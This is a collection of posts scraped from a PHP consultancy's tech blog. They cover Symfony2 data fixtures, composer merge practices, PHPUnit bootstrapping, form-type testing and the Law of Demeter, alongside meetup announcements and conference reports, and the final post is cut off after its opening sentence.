  				Cyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  			
  		
    
			

									"
"
										Dealing with data developing a new application is a real challenge for the development team. You often need them to develop and then test your app. For example, for a login system, you would need different users with roles and permissions in the database in order to test that the configuration is well set. To build a list of books, you would need books with author, title, description, picture and so on. In the end developers will need to create many fixtures to be able to test what they are developing.
When you are working on a fresh new project, you will create fake data. However, if you are working on an existing application, you may use a recent snapshot taken from the database on the production server. This way you will have data on your pages when you launch the application locally. But as far as tests are concerned, this can be problematic. When you write tests, you want them to stay independent of each other to avoid weird behaviors. Thus, to be sure that you will not have any problems, most of the time, you would reload the database with a set of data used by the test. So, loading the whole snapshot on each test will slow your tests down and you won’t run them as often as you should do (not to say never). Therefore you should use data fixtures.
Furthermore, fixtures will be of great help when you want to provide your Product Owner with test data after you deployed a new feature on the test server. It is the best way for you to make him able to see the result of your hard work quickly and easily.
I will try to show you some of the tools we use at Theodo.

Doctrine Fixtures
Doctrine fixtures is a PHP library that loads a set of data fixtures fully written in PHP. Creating a fixtures file is simple, you only have to create a PHP class that implements the FixtureInterface and instantiate as many object as you want to store.
class LoadUserData implements FixtureInterface
{
    public function load(ObjectManager $manager)
    {
        $user = new User();
        $user->setUsername(""benja-M-1"");

        $manager->persist($user);
        $manager->flush();
    }
}
Moreover, you can share objects between fixtures that ease the creation of
relation between your entities. If you want to have more information about
doctrine fixtures you should read the documentation from the
github repository. In a Symfony2 project, you can install the Doctrine fixtures library adding the DoctrineFixturesBundle in your composer.json file and registering the bundle in your AppKernel class.


Generating fake content
Sometimes you have to write fake data which can be a boring task. For example you want to provide a content for a blog post, but it could be written in latin, chinese, brainfuck, you don’t care. Faker is the perfect tool for that. It is a fake data generator that allows you to create fake text content, username, emails, urls, locations, etc. Here is a small and simple example:
class LoadUserData implements FixtureInterface
{
    public function load(ObjectManager $manager)
    {
        $faker = Faker\Factory::create();

        $user = new User();
        $user->setFirstname($faker->firstname);
        $user->setLastname($faker->lastname);

        $manager->persist($user);
        $manager->flush();
    }
}


Alice without Bob
Writing your fixtures with PHP can quickly be a problem: you will have to write a huge amount of code, even many files. To reduce this pain you should use Alice.
Alice is a PHP fixtures generator that allows you to load fixtures from PHP or Yaml files easily. Here is a snippet of code that loads some data fixtures from a Doctrine Fixtures class:
class LoadUserData implements FixtureInterface
{
    public function load(ObjectManager $manager)
    {
        // load objects from a yaml file
        $loader = new \Nelmio\Alice\Loader\Yaml();
        $objects = $loader->load(__DIR__.'/users.yml');

        $persister = new \Nelmio\Alice\ORM\Doctrine($manager);
        $persister->persist($objects);
    }
}
# users.yml
MyProject\User:
    user_1:
        firstName: ""Benjamin""
        lastName:  ""Grandfond""
        username:  ""benja-M-1""
        email:     ""benjaming@theodo.fr""
As you can see, creating and loading data is easy and will save you a lot of time, but it can be even easier:
class LoadUserData implements FixtureInterface
{
    public function load(ObjectManager $manager)
    {
        Fixtures::load(__DIR__.'/users.yml', $manager);
    }
}
Furthermore, you can generate a range of data with a simple notation to avoid duplication in your yaml files. For example, to generate 50 users you can do this:
# users.yml
MyProject\User:
    user_{1..50}:
        firstName: ""Benjamin""
        lastName:  ""Grandfond""
        username:  ""benja-M-1""
        email:     ""benjaming@theodo.fr""
Last but not least Alice natively integrates Faker, so you can write bunch of fake data in few lines of Yaml:
# users.yml
MyProject\User:
    user_{1..50}:
        firstName: <firstName()>
        lastName:  <lastName()>
        username:  <username()>
        email:     <email()>


Use SQL in your fixtures
Generally, you use Doctrine fixtures to load entities mapped in your Doctrine2 application and with Alice and Faker, why would you use SQL to create fixtures? Working with a legacy project you may need to load data that are not mapped in your fresh new Symfony2 app. Don’t forget that fixtures classes are written in PHP code so you can do whatever you want! By the way, you can access the EntityManager (or DocumentManager if you work with the ODM), so you are able to execute any SQL statement:
class LoadUserData implements FixturesInterface
{
    public function load(ObjectManager $manager)
    {
        // ... lot of stuff done before

        $connection = $manager->getConnection();

        $userId = $connection->fetchColumn(""SELECT id FROM sf_guard_user WHERE username like '%benjaming%'"");
        $groupId = $connection->fetchColumn(""SELECT id FROM sf_guard_group WHERE name like 'theodoer'"");

        $connection->exec(""INSERT INTO sf_guard_user_group (user_id, group_id) VALUES($userId, $groupId)"");
    }
}


What about pictures?
In my recent project, users were managed by a symfony 1 application and
pictures were stored inside its /web/uploads/users/avatar folder. I wanted to have some fake pictures in the list of users written with Symfony2, but I wrote the fixtures inside Symfony2 and I could not add the fake fixtures inside the upload folder as it was not versioned (hopefully…). Then the only solution that I found was to copy the files once the fixtures were loaded, but how?
Once again, they are written in PHP files, thus I can find these files and copy them where I want! Furthermore, implementing the ContainerAwareInterface I can access the Symfony2 container.
class LoadUserData implements FixturesInterface, ContainerAwareInterface
{
    public function load(ObjectManager $manager)
    {
        // ... lot of stuff done before

        // Copy images into the legacy application
        $fs = $this->container->get('filesystem');
        $legacyPath = $this->container->getParameter('legacy_path').'/web/uploads';
        $basePath = __DIR__.'/../Files';

        $finder = \Symfony\Component\Finder\Finder::create()
            ->files()
            ->in($basePath)
            ->ignoreDotFiles(true)
            ->ignoreVCS(true)
        ;

        foreach ($finder as $file) {
            if ($file->isFile()) {
                $newFile = str_replace($basePath, $legacyPath, $file->getPathname());
                $fs->copy($file->getPathname(), $newFile);
            }
        }
    }
}
With this solution every time I run the php app/console doctrine:fixtures:load command I have new users with their own pictures and the right sfGuardUserGroup associated. Adding the --append option to the command you can keep existing data loaded from the snapshot of your production server!
To conclude, if you don’t use fixtures in your project, then you should. It is the easiest way to test your development and getting feedback about what your are doing. Also, you should take as much care of your fixtures code as your production code or testing code because you will have to maintain them and may need to reuse them from one test case to another.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
 
Pour lancer la saison 2012-2013 des meetups Paris-Devops, Theodo organise la 10ème rencontre des devs et des ops dans ses nouveaux locaux le 10 octobre 2012. Orienté plutôt langage, la thématique de ce meetup sera PHP-Python-Ruby-Perl.
Pour assister aux présentations puis boire une bière pression avec les membres de la communauté devops inscrivez vous http://parisdevops-10.eventbrite.com. Il y aura beaucoup plus de places que la première fois 
Vous pouvez également proposer vos sujets de conférence si vous voulez intervenir sur la mailing list paris-devops@googlegroups.com.
Donc pour résumer :
Paris-Devops #10 le 10 octobre 2012 à partir de 19h chez Theodo, PHP-Python-Perl-Ruby-Bière
Inscriptions : http://parisdevops-10.eventbrite.com
Call for papers : https://groups.google.com/d/topic/paris-devops/_2BEpNca_y0/discussion
Adresse : 48 Boulevard des Batignolles 75017 Paris
Métros :

ligne 2, Rome
ligne 13, Place de Clichy
ligne 3, Europe
ligne 12 et 14, Saint-Lazare (+10min à pied)


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										
As a silver sponsor, we attended Forum PHP on June 5th and 6th. There is a lot to tell about it but for now here’s a quick review of the conferences we went to.


On Tuesday:

Rasmus Lerdorf brought back the history of PHP and covered all the brand new features of PHP 5.4
Rafael Dohms explained what annotations are
Benjamin Clay and Damien Alexandre, aka the “Rainbros”, spoke about LAMP alternatives
Kenny DITS shared the results of their experiments with application monitoring using Statsd and Graphite
Julien PAULI dived into core anatomy of PHP: how it works
Jean-Marc Fontaine listed all methods, including Composer, to implement external libraries in a PHP project
Besides, lightning talks were introduced for the very first time at a Forum PHP event, carried along by following participants:
Guillaume Plessis (Hip Hop)
Patrick Allaert (error handling with APM extension for PHP)
Christophe Villeneuve (password management)
Fabrice Bernhard (Relaunch of applications written in PHP with Theodo Evolution)
Sébastien Lucas (entrepreneurship in a PHP world)
Gerald CROES introduced Phing, the PHP version of Ant



On Wednesday:

Jérôme Renard explained how to use varnish with PHP application
Patrick Allaert spoke about PHP native data types, and more specifically arrays and their alternatives
Bastien Jaillot and Simon Perdrisat introduced us Drupal and third software use in Drupal
Enrico Zimuel present a build of simple web application with Zend Framework 2
Amaury Bouchard plunged us into the daemons, starting from initd to the viability of using PHP
Jérôme Vieilledent talked about concurrency and scalability in PHP applications and provided us with personal insights
Another new idea was “the CTO roundtable” during which they talked about the general use of PHP within large companies



In a nutshell, the first class conferences we had the privilege to attend led us to believe we’ll surely renew the experience next year.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Alix Chaysinh
  			
  				  			
  		
    
			

									"
"
										One of the difficulties when working with composer is how to merge its files.
When you are working on multiple branches with your team members and two of you
update the project, either to add a new package or to update one that is already
used by the project, you end up having a nasty merge conflict.
One solution for this would be a global composer update but this would result
in updating all bundles and some changes that are not tested could introduce bugs.
Even an update of only concerned bundles does not assure that you will end up with
the same bundle version that your colleague has tested.
So, what good practices could you adopt to make sure you are safe after a merge of
composer files?

Keep your composer up to date
Composer is still evolving and so are the files it uses. It may be one of the sources of conflicts – even if there were no major changes in the composer.json, a different composer version may generate a completely different composer.lock. To avoid such kind of merge errors, keep your composer up to date and use the same version in the team. If you use a composer.phar versionned in the project you can put someone in charge of updating it. If you prefer using local copies per user you can fix a day of the week when everyone updates it or have someone mail the correct version to the whole team.


Keep dependency changes visible
Anyone who is merging another branch should be able to say what has changed and when. To make this easy follow those simple rules:
1. Keep your commits atomic. If you are adding a dependency, make one addition at a time. Remember to keep your commit functional (in case someone needed to debug with git bisect) so think about updating your AppKernel and config files. If you are updating a dependency, composer lets you update packages separately:
composer update vendor/package
2. Keep a clear and consistent commit messages. Use a tag (like [deps]) and a good description. Use rather “[deps] Update CoolBundle to 1.3” or “[deps] Add CoolerBundle 1.0.3” than “updated deps”.


Do not use dependencies directly
Everytime you use a dependency of another project, add it to your composer.json file. This will help you to make sure that none of your functionalities is broken by an indirect update.


Try to never rely on dev-master
Whether you are a package owner or developing a project that depends on some package, try to avoid relying on dev-master. It is just plain wrong, that your project will work with the latest version all the time so it has no informational value. Also, if one package depends on a tagged version and another depends on a dev-master version it is just hell to maintain.
If you want to use a package in dev-master version – contact the maintainer and ask him if he could add a branch alias so you would use it rather than the dev-master.
If you see a package that relies on dev-master branch of another package and it can be replaced by a branch/tag – think about submitting a pull-request that fixes the issue. The few seconds you spend on this may save you a lot of headaches later.


Resolve conflicts consistently
Here is how you can resolve a composer conflict trying to keep most of the versions you are used to.
1. Use git to start the merge from your version of the file:
$ git checkout --ours composer.lock
2. See what has changed in composer.json:
$ git diff HEAD MERGE_HEAD -- composer.json
3. If a dependency has been removed you can safely remove it with composer:
$ composer update dependency-package
If there are no packages that were updated alongside you can safely add both composer files and finish the merge.
4. For each updated package, modify your composer.json if a tag was updated. If not, you can use the commit hash notation to download the correct version.
Remember to remove the commit tag once you have run the composer update command.
5. For every package that was added you need to user composer update package. This may change other dependencies but, unless you want to keep track of all of them
(which is not a great idea), it is your only option.

This is how I try to resolve a complicated composer merge when I face one. And how do you do it?

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										If you want to create an independent Symfony2 bundle, unit test are a must. Not only are they a good practice but they also help a lot with a day-to-day developpement work. There’s one problem though – how do you bootstrap them when the bundle is not in a project?
A bootstrap file is needed to create the test environement. When you are creating basic unit tests, all you really need is an autoloader that will load all your dependencies. You will need to have them defined first, but I trust that you already have a composer.json file in your project.
Actually composer can do everything you need – you can use the composer install command in the bundle itself to download all the needed components and use composer’s autoload file as a bootstrap.
Here is a sample phpunit.xml.dist configuration:
<?xml version=""1.0"" encoding=""UTF-8""?>
<phpunit
    bootstrap = ""./vendor/autoload.php"" >

    <testsuites>
        <testsuite name=""Project Test Suite"">
            <directory>./Tests</directory>
        </testsuite>
    </testsuites>

    <filter>
        <whitelist>
            <directory>./</directory>
            <exclude>
                <directory>./Resources</directory>
                <directory>./Tests</directory>
            </exclude>
        </whitelist>
    </filter>

</phpunit>
Sometimes you may need a more refined environement setup. You can easily create a bootstrap file while still using the composer autoloader. Just change the bootstrap in PHPUnit configuration to ./Test/bootstrap.php and add all you need there.
Here is a sample Test/bootstrap.php file:
<?php
if (!is_file($autoloadFile = __DIR__.'/../vendor/autoload.php')) {
    throw new \LogicException('Run ""composer install --dev"" to create autoloader.');
}

require $autoloadFile;

// Your custom configuration
There is one thing here that is worth emphasizing – the --dev option in composer. It tells composer to install packages defined in “require-dev” section. This sections lets you define dependencies required only while developing. A good example is your prefered mock library – the users will not run the tests, so they don’t care for it, but you do need it.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										When I started working at Theodo, in october 2009 (indeed, nearly 3 years ago :)), we were 6 people. Now, Theodo is an awesome team of 20 theodoers[1], each with a different profile (still working hard ;)), and many more will be coming in the next months. Our current office, at Rue Notre Dame des Victoires in Paris, is already too small! That is why, by the end of september, we will move to our new gigantic place at Boulevard des Batignolles. Yes I wrote “gigantic” because we are not used to large places like this:

2 floors:

1st floor: 120m2
2nd floor: 300m2 (our tv will be too small!)


48 places for developers
2 open spaces
3 meeting rooms
a large caféteria with seats to take coffee and discuss
…

We will be able to receive some sfpot meetups or php rendez-vous with a lot of attendees!
Finally, you may have noticed that a large part of this place will be empty at first so you (yes, you, brilliant PHP developer) must apply, as we are recruiting 😉
[1] “a doer: a person who gets things done.” http://www.yourdictionary.com/doer

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										This article has been transformed into a Symfony Cookbook article. Please, refer to it as it is now maintained by the community and will  surely be more up to date. The post below is kept for archiving purposes.
It has already been some time since I started working according to the TDD methodology.
Sometimes it is really challenging, because you need to find out how to test certain
framework components you’re extending. One of these components is the form component.
Finding how to test forms properly took me a while, so I would like to share what I learned.
Before starting to code I will explain what and why we test.
The form component itself consists of 3 classes: the FormType, the Form and the FormView.
The only class that is usually handled by programmers is the Type class which serves
as a form blueprint. It is used to generate the Form and the FormView. We
could test it directly, by mocking its interactions with the factory but it would be too
complicated with little gain. What we should do instead is to pass it to FormFactory
like it is done in real application. It is simple to bootstrap and we trust Symfony
components enough to use them as a testing base.
There is actually an existing class that we can benefit from for simple FormTypes testing,
the Symfony\Component\Form\Tests\Extension\Core\Type\TypeTestCase class. It is used to
test the core types and you can use it to test yours too.

The basics
The simplest TypeTestCase implementation looks like this:


<?php

namespace Acme\TestBundle\Tests\Form\Type;

use Acme\TestBundle\Form\Type\TestedType;
use Acme\TestBundle\Model\TestObject;
use Symfony\Component\Form\Tests\Extension\Core\Type\TypeTestCase;

class TestedTypeTest extends TypeTestCase
{
    public function testBindValidData()
    {
        $formData = array(
            'test' => 'test',
            'test2' => 'test2',
        );

        $type = new TestedType();
        $form = $this->factory->create($type);

        $object = new TestObject();
        $object->fromArray($formData);

        $form->bind($formData);
        $this->assertTrue($form->isSynchronized());

        $this->assertEquals($object, $form->getData());

        $view = $form->createView();
        $children = $view->children;

        foreach (array_keys($formData) as $key) {
            $this->assertArrayHasKey($key, $children);
        }
    }
}


So, what does it test? I will explain it line by line.


$type = new TestedType();
$form = $this->factory->create($type);


This will test if your FormType compiles to a form. This includes basic class inheritance,
the buildForm function and options resolution. This should be the first test you write.


$form->bind($formData);
$this->assertTrue($form->isSynchronized());


This test checks if none of your DataTransformers used by the form failed. The
isSynchronized is only set to false if a DataTransformer throws an exception. Note that we
don’t check the validation – it is done by a listener that is not active in the test case
and it relies on validation configuration. You would need to bootstrap the whole kernel to do it.
Write separate TestCases to test your validators.


$this->assertEquals($object, $form->getData());


This one verifies the binding of the form. It will show you if any of the fields were
wrongly specified.


$view = $form->createView();
$children = $view->children;

foreach (array_keys($formData) as $key) {
    $this->assertArrayHasKey($key, $children);
}


This one specifies if your views are created correctly. You should check if all widgets
you want to display are available in the children property.


The tricks
The test case above works for most of the forms, but you can actually have few issues
if you’re doing something a bit more sophisticated.

1. If your form uses a custom type defined as a service


<?php

// FormType buildForm
$builder->add('acme_test_child_type');

You need to make the type available to the form factory in your test. The easiest way is
to register it manually before creating the parent form:


<?php
$this->factory->addType(new TestChildType());

$type = new TestedType();
$form = $this->factory->create($type);



2. You use some options declared in an extension.
This happens often with ValidatorExtension (invalid_message is one of those options). The
TypeTestCase loads only the core Form Extension so an “Invalid option” exception will
be raised if you try to use it for testing a class that depends on other extensions. You need to
add them manually to the factory object:


class TestedTypeTest extends TypeTestCase
{
    protected function setUp()
    {
        parent::setUp();

        $this->factory = Forms::createFormFactoryBuilder()
            ->addTypeExtension(new FormTypeValidatorExtension($this->getMock('Symfony\Component\Validator\ValidatorInterface')))
            ->addTypeGuesser(
                $this->getMockBuilder('Symfony\Component\Form\Extension\Validator\ValidatorTypeGuesser')
                    ->disableOriginalConstructor()
                    ->getMock()
            )
            ->getFormFactory();

        $this->dispatcher = $this->getMock('Symfony\Component\EventDispatcher\EventDispatcherInterface');
        $this->builder = new FormBuilder(null, null, $this->dispatcher, $this->factory);
    }

    /** your tests */
}




3. You want to test against different sets of data.
If you are not familiar yet with PHPUnit’s data providers it would be a good opportunity to
use them:


class TestedTypeTest extends TypeTestCase
/**
 * @dataProvider getValidTestData
 */
public function testForm($data)
{
    /**
     * Do your tests
     */
}

public function getValidTestData()
{
    return array(
                array(
                    'data' => array(
                        'test' => 'test',
                        'test2' => 'test2',
                    ),
                ),
            array(
                    'data' => array(
                    ),
                ),
                array(
                    'data' => array(
                        'test' => null,
                        'test2' => null,
                    ),
                ),
            );
}


This will run your test three times with 3 different sets of data. This allows for
decoupling the test fixtures from the tests and easily testing against multiple sets of
data.
You can also pass another argument, such as a boolean if the form has to be synchronized with
the given set of data or not etc.
Hope these tips will be helpful!



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marek Kalnik
  			
  				Marek Kalnik - a Technical Team Manager working with us since 2010 - is a PHP and JavaScript passionate. His main centers of interests include: Symfony 2, object-oriented JavaScript, code quality and good practices.  			
  		
    
			

									"
"
										This blog post is in French as the event it relates to is French-only.
 
Theodo accueille le prochain sfPot dans ses tout nouveaux locaux le 8 octobre.
Alexandre Salomé nous parlera des performances du framework Symfony2 : chargement des classes, dépendances, services, cache applicatif… Un sujet (ou un orateur ?) qui intéresse manifestement beaucoup de monde, puisque les 70 places proposées sont déjà parties ! (Il est encore possible de s’inscrire sur la liste d’attente).
La présentation sera suivie d’un pot sur place, offert par Theodo (bière pression incluse !)
Détails pratiques :
Date : le 8 octobre à partir de 19H00
Inscriptions : closes pour l’instant (http://www.eventbrite.com/event/4428754524 pour la liste d’attente)
Adresse : 48 Boulevard des Batignolles 75017 Paris
Métros :

ligne 2, Rome
ligne 13, Place de Clichy
ligne 3, Europe
ligne 12 et 14, Saint-Lazare (+10min à pied)


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Henri Cumenge
  			
  				  			
  		
    
			

									"
"
										Two weeks ago most of the development team was at Symfony Live in Berlin. It was a pleasure for all of us to be there, meeting core team devs, talking with other Symfony user, seeing Fabrice on stage, speaking about Theodo Evolution with people with similar issues and hacking on TheodoRogerCmsBundle or Symfttpd. So let me tell you what we did there.
The talks
As there were only one track we didn’t have to choose between two or three conferences. So we attended every one and, as in Paris, found a great balance between Symfony specific talk and others more loosely related.
In the first group, I particularly liked Bernhard Schussek brilliantly succeeding at making us become gurus of the Symfony 2 Form component. The form component has a reputation of being one of the most complicated to use, but Bernhard somehow managed to make it look clear and simple. Two other Symfony-related talks addressed one of the current hot topics around Symfony2, especially for us at Theodo: how to integrate Symfony with other projects. First on thursday Jérôme Vieilledent exposed how ezPublish integrated the Symfony fullstack framework into the fifth version of their CMS maintaining the backward compatibility. On Friday our CTO Fabrice Bernhard gave the best talk of the two days: Modernisation of legacy PHP applications using Symfony2 (yes I’m totally objective  )
In the second group, Johann Peter Hartmann gave some very interesting insight into the classic issue of performance : more often than not, the cause of performance issues lies outside the code. The talk was complete with concrete examples and specific tools to detect the origin of failures. This is closely related to our current concern about devops good practices : web developers need to be aware of the global context of their application deployment. Then Nils Adermann gave us some tricks to properly use Composer and more. If you thought composer was awesome, just have a look at those tricks: it’s even better! A last one I’d like to mention is Tobias Schlitt’s how to make our applications SOLID; beyond the the well known theoretical concepts, he gave us practical ways of achieving a SOLID application. Coding good practices are a special interest of mine, and it is a pleasure to observe the PHP world evolve in this direction.
This is exactly what David Coallier expressed in his one-man show of a keynote, convincing us (but weren’t we already ?) that PHP is as good as any other languages and that we should be proud to be members of the PHP community.
Finally, Fabien Potencier closed the two days with his keynote eplaining that the way we do something is not always the best, he also exposed the fact that today it’s more complicated to start coding than ever before, when the computer started with a command line interface (I have to admit I did not experience this time). That’s why Sensio started building their SensioLabsDesktop application that eases the process to start working on a Symfony project (maybe simple PHP too?).

Symfony certification
On Friday morning (day two for those who are lost), while some of us were watching Benjamin Eberlei and Hugo Hamon, others were sitting the Symfony Certification. It was a bit stressful but we are proud to say that Marek and Mathieu passed successfully!

Hacking day
On saturday we stayed for the hacking day where around 80 people were present to work on Symfony, Symfony CMF, Drupal and other stuff. Marek and some of the Theodo’ers closed somes issues on the TheodoRogerCMS bundle, while I was fixing bugs in the new version of Symfttpd (an other blog post will be available soon). It was also a good opportunity to meet users of the framework, speak about Theodo Evolution, exchanging about modernisation of a legacy project…
For most of the team it was our first time in Berlin and we really enjoyed our trip. Moreover we attended great conferences, we brought back a lot of ideas and Symfony goodies (gumbears, stickers, pens, etc…).
The nights in Berlin
Nothing happened. Really.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										Sensio launched its Symfony2 certification some six month ago, aimed at certifying the deep understanding and practical skills in Symfony2 of the developers who pass it.
Sensio’s CTO Fabien Potencier himself said that “its level is hard!”, and as the time of writing there is a total of only 33 certified developers. Hence,  even though Benjamin just talked about it in the previous article, I think Marek Kalnik and Mathieu Dähne deserve a separate short news for being our first two Symfony2 certified developers. So congrats to both of our colleagues, and hopefully some more of our excellent developers will join them soon 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Pierre-Henri Cumenge
  			
  				  			
  		
    
			

									"
"
										
The other day, I stumbled upon the following code that I wrote a few days before.

<?php
// src/Foo/BarBundle/Manager/ReportManager.php

namespace Foo\BarBundle\Manager;

use Symfony\Component\Security\Core\SecurityContextInterface;
use Symfony\Component\Finder\Finder;

class ReportManager
{
    /**
     * @var \Symfony\Component\Security\Core\SecurityContextInterface
     */
    protected $securityContext;

    /**
     * @var String
     */
    protected $baseDir;

    /**
     * @param string                                                    $directory
     * @param \Symfony\Component\Security\Core\SecurityContextInterface $context
     */
    public function __construct($directory, SecurityContextInterface $context)
    {
        $this->baseDir         = $directory;
        $this->securityContext = $context;
    }

    /**
     * Returns files for a specific year.
     *
     * @param int $year
     *
     * @return array
     */
    public function getFiles($year)
    {
        if (null == $this->securityContext->getToken()) {
            throw new \Exception('There is no token in the security context');
        }

        $company = $this->securityContext->getToken()->getUser()->getSelectedCompany();

        $finder = new Finder();
        $finder->files()->in($this->baseDir.""/$year/{$company->getCode()}"");

        return iterator_to_array($finder, false);
    }
}

Here is the service definition in the FooBarBundle.

# src/Foo/BarBundle/Resources/config/services.yml

parameters:
    manager.report.class: Foo\BarBundle\Manager\ReportManager

services:
    manager.report:
        class: %manager.report.class%
        arguments:
            - 'path/to/reports'
            - @security.context

The usage of this class is really simple: you call the method
getFiles of the service in any part of your application an you’ll get an
array of files. Here is an example in a controller:

// src/Foo/BarBundle/Controller/ReportController.php

// ... lot of code in your controller
public function listAction($year)
{
    $files = $this->get('manager.report')->getFiles(date('Y'));

    return new Response($this->renderView(
        'FooBarBundle:Report:list.html.twig',
        array('files' => $files)
    ));
}

Here is my question, can you guess what’s wrong in all this code? … Ok that’s
not really obvious at first. The problem in this code is the ReportManager
class.
First of all it is in the Namespace Foo\BarBundle\Manager. ""Manager"" does
not mean anything except that every classes contained in this namespace
manages things. The name is not really well chosen, it could have been
Foo\BarBundle\FileManager instead, or the file could have been directly in
the Foo\BarBundle namespace.
But it’s not the main problem… It appeared to me when I decided to test it
(I should have done it really earlier) after adding some code to this class.
Here is the test I started to write:

<?php

namespace Foo\BarBundle\Tests\Manager;

use Foo\BarBundle\Manager\ReportManager;

class ReportManagerTest extends \PHPUnit_Framework_TestCase
{
    public function testGetFiles()
    {
        $company = $this->getMock('Foo\BarBundle\Entity\Company');
        $company->expects($this->once())
            ->method('getCode')
            ->will($this->returnValue('foo'));

        $user = $this->getMock('Symfony\Component\Security\Core\User\UserInterface');
        $user->expects($this->once())
            ->method('getSelectedCompany')
            ->will($this->returnValue($company));

        $token = $this->getMock('Symfony\Component\Security\Core\Authentication\Token\TokenInterface');
        $token->expects($this->once())
            ->method('getUser')
            ->will($this->returnValue($user));

        $securityContext = $this->getMock('Symfony\Component\Security\Core\SecurityContextInterface');
        $securityContext->expects($this->exactly(2))
            ->method('getToken')
            ->will($this->returnValue($token));

        $reportManager = new ReportManager('bar', $securityContext);
        $this->assertCount(0, $reportManager->getFiles(2013));
    }
}

Do you see what the problem is with the ReportManager class now?
Have you ever heard about the Law of Demeter? Well that’s the perfect moment to
introduce it to you. The Law of Demeter is a development design principle
which states that an object’s method should only interact with:

the object itself
the method’s parameters
any object created within the method or the object’s component objects (parents etc.).

Basicaly, an object A can interact with an object B but cannot use it to get an object C.
Obviously, the code I wrote did not respect this principle at all! I injected
the SecurityContext in the constructor to use it in the getFiles method
I needed it because the context allowed me to have the current connected User through
the Token and then, calling the getSelectedCompany, I could have the company’s code.
Why did I do that? Well because injecting the SecurityContext is the only
way to retrieve the connected user. And with this user I can retrieve the
current selected company’s code.
So do you think that the injection was well chosen? Surely not, and it’s not
needed either. The unit test shows that because I need to mock 4 objects to
have a simple string (the code) in the getFiles method.
Seeing this, I immediatly refactored it this way:

<?php

namespace Foo\BarBundle\Manager;

use Symfony\Component\Finder\Finder;

class ReportManager
{

    /**
     * @var String
     */
    protected $baseDir;

    /**
     * @param string $directory
     */
    public function __construct($directory)
    {
        $this->baseDir = $directory;
    }

    /**
     * Returns files for a specific year.
     *
     * @param int    $year
     * @param string $code The company code
     *
     * @return array
     */
    public function getFiles($year, $code)
    {
        $finder = new Finder();
        $finder->files()->in($this->baseDir.""/$year/{$code}"");

        return iterator_to_array($finder, false);
    }
}

Then I updated the service definition accordingly to these changes, I removed
the dependency to the security.context service:

services:
    manager.report:
        class: %manager.report.class%
        arguments:
            - 'path/to/reports'

And I moved the logic that retrieves the company’s code into the controller:

// src/Foo/BarBundle/Controller/ReportController.php

// ... lot of code in your controller
public function listAction($year)
{
    $company = $this->getUser()->getSelectedCompany();
    $files = $this->get('manager.report')->getFiles(date('Y'),$company->getCode());

    return new Response($this->renderView(
        'FooBarBundle:Report:list.html.twig',
        array('files' => $files)
    ));
}

Then the test looks much cleaner:

<?php

namespace Foo\BarBundle\Tests\Manager;

use Foo\BarBundle\Manager\ReportManager;

class ReportManagerTest extends \PHPUnit_Framework_TestCase
{
    public function testGetFiles()
    {
        $reportManager = new ReportManager('bar');
        $this->assertCount(0, $reportManager->getFiles(2013, 'foo'));
    }
}

This mistake led me to 2 conclusions:
First, it is another point in favor of TDD: had I TDD’ed the whole thing, I would never
have written such over-complicated code…  And second, you should not overuse dependency
injection, its ease of use makes it sometimes the obvious solution, but not the simplest
nor the best one. So next time you add a dependency, just pause for half a second and
ask yourself: is it really necessary ?


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Benjamin Grandfond
  			
  				Benjamin Grandfond - He is ""Technical Team Manager"". Symfony and PHP expert, he likes when you write your tests first and then code. His main interests are Code Quality, best practices, REST architecture and building great new PHP applications over old ones.  			
  		
    
			

									"
"
										Time for a short (and somewhat late) report about the main event for the Symfony (and PHP) community in Paris and of course for us at Theodo: sfLive, which we sponsored and attended.
